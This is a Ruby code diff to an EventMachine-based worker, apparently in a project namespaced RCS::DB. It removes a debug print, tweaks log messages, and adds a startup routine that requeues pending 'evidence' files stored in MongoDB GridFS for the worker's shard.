@@ -94,8 +94,6 @@ module HTTPHandler
     #   @http_post_content
     #   @http_headers
 
-    puts @http_post_content
-    
     #trace :info, "[#{@peer}] Incoming HTTP Connection"
     size = @http_post_content.nil? ? 0 : @http_post_content.bytesize
     trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"
@@ -182,10 +180,10 @@ class Worker
     
     # main EventMachine loop
     begin
-
+      
       # process all the pending evidence in the repository
       #resume
-
+      
       # all the events are handled here
       EM::run do
         # if we have epoll(), prefer it over select()
@@ -194,9 +192,12 @@ class Worker
         # set the thread pool size
         EM.threadpool_size = 50
         
+        resume_pending_evidences
+
         EM::start_server("0.0.0.0", port, HTTPHandler)
-        trace :info, "Listening on port #{port}..."
+        trace :info, "listening on port #{port}"
         
+        trace :info, "Worker '#{RCS::DB::Config.instance.global['SHARD']}' ready!"
       end
     rescue Interrupt
       trace :info, "User asked to exit. Bye bye!"
@@ -204,12 +205,26 @@ class Worker
     rescue Exception => e
       # bind error
       if e.message.eql? 'no acceptor'
-        trace :fatal, "Cannot bind port #{Config.instance.global['LISTENING_PORT']}"
+        trace :fatal, "Cannot bind port #{RCS::DB::Config.instance.global['LISTENING_PORT']}"
         return 1
       end
       raise
     end
     
+  end
+
+  def resume_pending_evidences
+    begin
+      db = Mongoid.database
+      evidences = db.collection('grid.evidence.files').find({metadata: {shard: RCS::DB::Config.instance.global['SHARD']}})
+      evidences.each do |ev|
+        ident, instance = ev['filename'].split(":")
+        trace :info, "Processing pending evidence #{ev['_id']}"
+        QueueManager.instance.queue instance, ident, ev['_id'].to_s
+      end
+    rescue Exception => e
+      trace :error, "Cannot process pending evidences: #{e.message}"
+    end
   end
 
 end
